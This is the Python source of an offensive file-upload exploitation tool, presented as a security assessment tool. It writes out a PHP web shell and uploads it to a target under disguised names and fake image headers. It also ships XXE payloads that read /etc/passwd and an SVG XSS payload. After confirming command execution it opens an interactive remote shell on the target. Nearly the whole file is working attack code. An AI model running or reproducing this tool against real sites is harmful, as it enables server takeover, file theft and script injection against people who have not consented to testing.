import os
import sys
import tempfile
import requests
import argparse
import concurrent.futures
import time
import logging
import re
import base64
from urllib.parse import urljoin
from rich.console import Console
from rich.table import Table
from rich.text import Text

console = Console()

BANNER = r"""
  ______ _ _        _                 _                       
 |  ____(_) |      | |               | |                      
 | |__   _| | ___  | |__  _   _ _ __ | | _____ _ __ ___  _ __  
 |  __| | | |/ _ \ | '_ \| | | | '_ \| |/ / _ \ '__/ _ \| '_ \ 
 | |    | | |  __/ | |_) | |_| | | | |   <  __/ | | (_) | | | |
 |_|    |_|_|\___| |_.__/ \__,_|_| |_|_|\_\___|_|  \___/|_| |_|

       [👻] F I L E _ U P L O A D E R . P Y [👻]
       
    Professional File Upload Security Assessment Tool
    Author: Gh0stSh3ll5619 | Ghostops-security.com
"""

EXTENSION_CATEGORIES = {
    "php": ["php", "php3", "php4", "php5", "php7", "phar", "phtml", "phtm", "inc", "pHp", "PhAr"],
    "asp": ["asp", "aspx", "config", "cer", "asa"],
    "jsp": ["jsp", "jspx", "jsw", "jsv", "jspf"],
    "other": ["svg", "gif", "html", "xml"],
}

SPECIAL_CHARS = ['%20', '%0a', '%00', '%0d0a', '/', '.\\', '.', '…']
DEFAULT_CONTENT_TYPES = ['image/jpeg', 'image/png', 'image/gif', 'image/svg+xml', 'image/webp']

MAGIC_HEADERS = {
    'jpeg': b'\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01',
    'png': b'\x89PNG\r\n\x1a\n',
    'gif': b'GIF89a',
}

WEB_SHELL = "<?php echo 'CMD:'; system($_GET['cmd']); ?>"

XXE_SIMPLE = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "{xxe_path}"> ]>
<root>&xxe;</root>"""

XXE_STANDARD = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "{xxe_path}"> ]>
<svg width="500" height="500" xmlns="http://www.w3.org/2000/svg">
  <text x="0" y="16" font-size="16">&xxe;</text>
</svg>"""

XXE_BASE64 = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource={xxe_path}">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %exfil;
]>
<svg width="500" height="500" xmlns="http://www.w3.org/2000/svg">
  <text x="0" y="16" font-size="16">XXE Test</text>
</svg>"""

XSS_SVG = """<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
<script type="text/javascript">alert(window.origin);</script>
</svg>"""

SHELL_FILEPATH = os.path.join(os.getcwd(), "payload_shell.php")
with open(SHELL_FILEPATH, 'w') as f:
    f.write(WEB_SHELL)

XSS_SVG_PATH = os.path.join(os.getcwd(), "payload_xss.svg")
with open(XSS_SVG_PATH, 'w') as f:
    f.write(XSS_SVG)


def create_payload_with_magic_bytes(magic_bytes):
    tmp_fd, tmp_path = tempfile.mkstemp()
    with os.fdopen(tmp_fd, 'wb') as tmp_file:
        if magic_bytes.startswith(b'\xFF\xD8') or magic_bytes.startswith(b'\x89PNG'):
            tmp_file.write(b'GIF89a')
        else:
            tmp_file.write(magic_bytes)
        tmp_file.write(b'\n')
        tmp_file.write(WEB_SHELL.encode())
    return tmp_path


def generate_xxe_payloads(xxe_paths, xxe_variants):
    payloads = {}
    templates = {
        'standard': XXE_STANDARD, 
        'base64': XXE_BASE64,
        'simple': XXE_SIMPLE
    }
    
    for path in xxe_paths:
        safe_name = path.replace('/', '_').replace('.', '_').replace(':', '_')
        for variant in xxe_variants:
            if variant in templates:
                content = templates[variant].format(xxe_path=path)
                file_path = os.path.join(os.getcwd(), "xxe_" + variant + "_" + safe_name + ".xml")
                with open(file_path, 'w') as f:
                    f.write(content)
                payloads[variant + "-" + safe_name] = (file_path, "XXE " + variant + " " + path)
    return payloads


def upload_file(upload_url, filename, content_type, magic_bytes, payload_path, param_name, cookies, headers, proxies):
    if payload_path:
        file_to_send = open(payload_path, 'rb')
    elif magic_bytes:
        temp_path = create_payload_with_magic_bytes(magic_bytes)
        file_to_send = open(temp_path, 'rb')
    else:
        file_to_send = open(SHELL_FILEPATH, 'rb')

    files = {param_name: (filename, file_to_send, content_type)}
    
    try:
        response = requests.post(upload_url, files=files, timeout=10, cookies=cookies, 
                               headers=headers, proxies=proxies, verify=False)
        file_to_send.close()
        
        if response.status_code in [200, 201] or "success" in response.text.lower():
            return True
    except:
        pass
    return False


def test_rce(url, cookies, headers, proxies):
    try:
        response = requests.get(url + "?cmd=id", timeout=10, cookies=cookies, 
                              headers=headers, proxies=proxies, verify=False)
        
        text = response.text
        
        if "<?php" in text or "system($_GET" in text:
            return None
        
        if any(i in text for i in ["uid=", "www-data", "root", "CMD:"]):
            return text.strip()
    except:
        pass
    return None


def test_xxe(url, cookies, headers, proxies):
    try:
        response = requests.get(url, timeout=10, cookies=cookies, headers=headers, 
                              proxies=proxies, verify=False)
        text = response.text
        
        if len(text) < 10:
            return None
        
        b64_matches = re.findall(r'[A-Za-z0-9+/]{100,}={0,2}', text)
        if b64_matches:
            return "Base64 found:\n" + b64_matches[0]
        
        indicators = ["root:", "daemon:", "flag{", "HTB{", "<?php", "password", "upload"]
        
        comments = re.findall(r'<!--(.*?)-->', text, re.DOTALL)
        for comment in comments:
            if any(ind in comment for ind in indicators):
                return "XXE in comment:\n" + comment[:500]
        
        svg_texts = re.findall(r'<text[^>]*>(.*?)</text>', text, re.DOTALL | re.IGNORECASE)
        for svg_text in svg_texts:
            if len(svg_text) > 100:
                return "Base64 in SVG:\n" + svg_text
            if any(ind in svg_text for ind in indicators):
                return "XXE in SVG:\n" + svg_text[:500]
        
        all_tags = re.findall(r'<[^>]+>(.*?)</[^>]+>', text, re.DOTALL)
        for tag_content in all_tags:
            stripped = tag_content.strip()
            if len(stripped) > 100:
                return "Base64 in XML:\n" + stripped
        
        for ind in indicators:
            if ind in text:
                idx = text.find(ind)
                return "XXE found:\n" + text[max(0,idx-50):idx+500]
        
        if len(text) > 200:
            return "Possible XXE:\n" + text[:300]
                
    except Exception as e:
        logging.debug("XXE error: " + str(e))
    return None


def test_xss(url, cookies, headers, proxies):
    try:
        response = requests.get(url, timeout=10, cookies=cookies, headers=headers, 
                              proxies=proxies, verify=False)
        if any(x in response.text for x in ["<script", "onerror=", "alert("]):
            return "XSS payload reflected"
    except:
        pass
    return None


def generate_variants(base_name, ext):
    variants = [base_name + ".jpg." + ext, base_name + "." + ext + ".jpg"]
    for char in SPECIAL_CHARS:
        variants.extend([
            base_name + char + "." + ext + ".jpg",
            base_name + "." + ext + char + ".jpg",
            base_name + ".jpg" + char + "." + ext,
        ])
    return variants


def run_rce_attack(upload_url, base_url, extensions, content_types, use_magic, upload_path, 
                   param_name, cookies, headers, proxies, stop_on_success):
    results = []
    shells = []
    stop_flag = [False]

    def process(ext):
        if stop_flag[0]:
            return
        for filename in generate_variants("ghostshell", ext):
            if stop_flag[0]:
                return
            for ctype in content_types:
                if stop_flag[0]:
                    return
                if use_magic:
                    for m_name, m_bytes in MAGIC_HEADERS.items():
                        if stop_flag[0]:
                            return
                        uploaded = upload_file(upload_url, filename, ctype, m_bytes, None, 
                                             param_name, cookies, headers, proxies)
                        url = urljoin(base_url, upload_path + filename)
                        
                        if uploaded:
                            output = test_rce(url, cookies, headers, proxies)
                            status = output if output else "Uploaded but no RCE"
                            results.append((filename, url, status, ctype, m_name))
                            
                            if output and "CMD:" in output:
                                shells.append(url)
                                console.print("\n[bold green]✓ RCE FOUND: " + filename + " (" + m_name + ")[/bold green]")
                                if stop_on_success:
                                    stop_flag[0] = True
                                    return
                        else:
                            results.append((filename, url, "Upload failed", ctype, m_name))
                else:
                    uploaded = upload_file(upload_url, filename, ctype, None, None, 
                                         param_name, cookies, headers, proxies)
                    url = urljoin(base_url, upload_path + filename)
                    
                    if uploaded:
                        output = test_rce(url, cookies, headers, proxies)
                        status = output if output else "Uploaded but no RCE"
                        results.append((filename, url, status, ctype, "None"))
                        
                        if output and "CMD:" in output:
                            shells.append(url)
                            console.print("\n[bold green]✓ RCE FOUND: " + filename + "[/bold green]")
                            if stop_on_success:
                                stop_flag[0] = True
                                return
                    else:
                        results.append((filename, url, "Upload failed", ctype, "None"))

    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        list(executor.map(process, extensions))

    return results, shells


def run_xxe_attack(upload_url, base_url, xxe_paths, xxe_variants, upload_path, 
                   param_name, cookies, headers, proxies, stop_on_success, content_types=None):
    results = []
    exploits = []
    stop_flag = [False]
    
    payloads = generate_xxe_payloads(xxe_paths, xxe_variants)
    extensions = ['xml']
    
    if not content_types:
        content_types = [
            'application/xml',
            'text/xml',
            'image/svg+xml',
            'text/plain',
            'application/x-xml'
        ]
    
    console.print("[cyan]Testing " + str(len(content_types)) + " Content-Types for XXE[/cyan]")
    
    def process(ext):
        if stop_flag[0]:
            return
        for filename in ["xxe." + ext, "test." + ext, "upload." + ext]:
            if stop_flag[0]:
                return
            for content_type in content_types:
                if stop_flag[0]:
                    return
                for payload_key, payload_info in payloads.items():
                    if stop_flag[0]:
                        return
                    
                    payload_path = payload_info[0]
                    payload_desc = payload_info[1]
                    
                    uploaded = upload_file(upload_url, filename, content_type, None, payload_path, 
                                         param_name, cookies, headers, proxies)
                    url = urljoin(base_url, upload_path + filename)
                    
                    if uploaded:
                        output = test_xxe(url, cookies, headers, proxies)
                        status = output if output else "Uploaded but no XXE"
                        results.append((filename, url, status, payload_desc, content_type))
                        
                        if output:
                            exploits.append(url)
                            console.print("\n[bold green]✓ XXE FOUND: " + filename + "[/bold green]")
                            console.print("[bold cyan]Content-Type: " + content_type + "[/bold cyan]")
                            console.print("[bold cyan]Payload: " + payload_desc + "[/bold cyan]")
                            console.print("\n[yellow]Raw output:[/yellow]")
                            console.print(output[:800])
                            
                            try:
                                b64_match = re.search(r'[A-Za-z0-9+/]{40,}={0,2}', output)
                                if b64_match:
                                    b64_data = b64_match.group(0)
                                    decoded = base64.b64decode(b64_data).decode('utf-8', errors='ignore')
                                    console.print("\n[bold green]Base64 Decoded:[/bold green]")
                                    console.print(decoded[:2000])
                            except:
                                pass
                            
                            if stop_on_success:
                                stop_flag[0] = True
                                return
                    else:
                        results.append((filename, url, "Upload failed", payload_desc, content_type))

    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        list(executor.map(process, extensions))

    return results, exploits


def run_xss_attack(upload_url, base_url, upload_path, param_name, cookies, headers, proxies, stop_on_success):
    results = []
    exploits = []
    extensions = ['html', 'svg', 'xml']
    
    for ext in extensions:
        for filename in ["xss." + ext, "test." + ext]:
            uploaded = upload_file(upload_url, filename, 'text/html', None, XSS_SVG_PATH, 
                                 param_name, cookies, headers, proxies)
            url = urljoin(base_url, upload_path + filename)
            
            if uploaded:
                output = test_xss(url, cookies, headers, proxies)
                status = output if output else "Uploaded but no XSS"
                results.append((filename, url, status, "XSS", "text/html"))
                
                if output:
                    exploits.append(url)
                    console.print("\n[bold green]✓ XSS FOUND: " + filename + "[/bold green]")
                    if stop_on_success:
                        break
            else:
                results.append((filename, url, "Upload failed", "XSS", "text/html"))

    return results, exploits


def print_results(results):
    table = Table(show_header=True, header_style="bold magenta")
    table.add_column("Filename Variant")
    table.add_column("Shell URL")
    table.add_column("Execution Output")
    table.add_column("Content-Type Used")
    table.add_column("Magic Bytes")

    for filename, url, output, ctype, magic in results:
        if "uid=" in output or "CMD:" in output or "XXE" in output or "XSS" in output or "Base64" in output:
            color = "green"
        elif "Upload failed" in output:
            color = "red"
        else:
            color = "yellow"

        table.add_row(
            Text(filename, style=color),
            Text(url[:50], style=color),
            Text(output.split('\n')[0][:50], style=color),
            Text(ctype, style=color),
            Text(magic, style=color)
        )
    
    console.print("\n[bold green]File Upload Results[/bold green]")
    console.print(table)


def shell_interaction(shell_url, cookies, headers, proxies):
    console.print("\n[bold green]Web shell: " + shell_url + "[/bold green]")
    while True:
        cmd = input("shell> ").strip()
        if cmd.lower() in ('exit', 'quit'):
            break
        try:
            resp = requests.get(shell_url + "?cmd=" + cmd, timeout=10, cookies=cookies, 
                              headers=headers, proxies=proxies, verify=False)
            print(resp.text.strip())
        except Exception as e:
            print("Error: " + str(e))


def main():
    console.print(BANNER, style="bold cyan")

    parser = argparse.ArgumentParser(description="File Upload Security Assessment Tool")
    
    parser.add_argument("--upload-url", required=True, help="Upload endpoint")
    parser.add_argument("--base-url", required=True, help="Base URL")
    parser.add_argument("--upload-path", default="/profile_images/", help="Upload directory")
    parser.add_argument("--attack-mode", choices=['rce', 'xxe', 'xss'], required=True, help="Attack mode")
    
    parser.add_argument("--extensions", nargs='+', help="Extensions to test")
    parser.add_argument("--fuzz-content-type", action="store_true", help="Fuzz Content-Type")
    parser.add_argument("--content-types", nargs='+', help="Custom Content-Types")
    parser.add_argument("--magic-bytes", action="store_true", help="Enable magic bytes")
    
    parser.add_argument("--xxe-paths", nargs='+', help="XXE file paths")
    parser.add_argument("--xxe-variants", nargs='+', choices=['standard', 'base64', 'simple', 'all'], help="XXE variants")
    
    parser.add_argument("--param-name", default="uploadFile", help="Parameter name")
    parser.add_argument("--cookies", help="Cookies")
    parser.add_argument("--headers", help="Headers")
    parser.add_argument("--proxy", help="Proxy URL")
    parser.add_argument("--stop-on-success", action="store_true", help="Stop after first exploit")
    parser.add_argument("--verbose", "-v", action="store_true", help="Verbose")

    args = parser.parse_args()

    cookies = None
    if args.cookies:
        cookies = {}
        for item in args.cookies.split(';'):
            if '=' in item:
                k, v = item.strip().split('=', 1)
                cookies[k] = v
    
    headers = None
    if args.headers:
        headers = {}
        for item in args.headers.split('|'):
            if ':' in item:
                k, v = item.strip().split(':', 1)
                headers[k] = v
    
    proxies = {'http': args.proxy, 'https': args.proxy} if args.proxy else None
    
    if args.proxy:
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    console.print("[cyan]Target: " + args.upload_url + "[/cyan]")
    console.print("[cyan]Mode: " + args.attack_mode.upper() + "[/cyan]")

    if args.attack_mode == 'rce':
        extensions = args.extensions or EXTENSION_CATEGORIES['php'][:10]
        if args.fuzz_content_type:
            content_types = args.content_types or DEFAULT_CONTENT_TYPES
        else:
            content_types = args.content_types or ['image/jpeg']
        
        console.print("[cyan]Extensions: " + str(len(extensions)) + " | Content-Types: " + str(len(content_types)) + "[/cyan]")
        results, shells = run_rce_attack(args.upload_url, args.base_url, extensions, content_types, 
                                        args.magic_bytes, args.upload_path, args.param_name, 
                                        cookies, headers, proxies, args.stop_on_success)
        print_results(results)
        
        if shells:
            console.print("\n[bold green]✓ Found " + str(len(shells)) + " working shell(s)![/bold green]")
            if len(shells) == 1:
                shell_interaction(shells[0], cookies, headers, proxies)
            else:
                console.print("\n[bold cyan]Multiple shells available:[/bold cyan]")
                for i, s in enumerate(shells[:10]):
                    console.print("  [" + str(i) + "] " + s)
                try:
                    choice = input("\nSelect shell [0]: ").strip()
                    idx = int(choice) if choice else 0
                    if 0 <= idx < len(shells):
                        shell_interaction(shells[idx], cookies, headers, proxies)
                    else:
                        console.print("[yellow]Invalid selection, using first shell[/yellow]")
                        shell_interaction(shells[0], cookies, headers, proxies)
                except KeyboardInterrupt:
                    console.print("\n[yellow]Skipping shell interaction[/yellow]")
                except:
                    shell_interaction(shells[0], cookies, headers, proxies)
            
    elif args.attack_mode == 'xxe':
        xxe_paths = args.xxe_paths or ['file:///etc/passwd', 'file:///etc/hosts']
        xxe_variants = ['standard', 'base64', 'simple'] if 'all' in (args.xxe_variants or []) else (args.xxe_variants or ['simple'])
        
        content_types = args.content_types if args.content_types else None
        
        console.print("[cyan]XXE Paths: " + str(len(xxe_paths)) + " | Variants: " + str(len(xxe_variants)) + "[/cyan]")
        results, exploits = run_xxe_attack(args.upload_url, args.base_url, xxe_paths, xxe_variants, 
                                          args.upload_path, args.param_name, cookies, headers, proxies, 
                                          args.stop_on_success, content_types)
        print_results(results)
        
    elif args.attack_mode == 'xss':
        results, exploits = run_xss_attack(args.upload_url, args.base_url, args.upload_path, 
                                          args.param_name, cookies, headers, proxies, args.stop_on_success)
        print_results(results)

    console.print("\n[bold green]Assessment Complete[/bold green]")


if __name__ == "__main__":
    main()
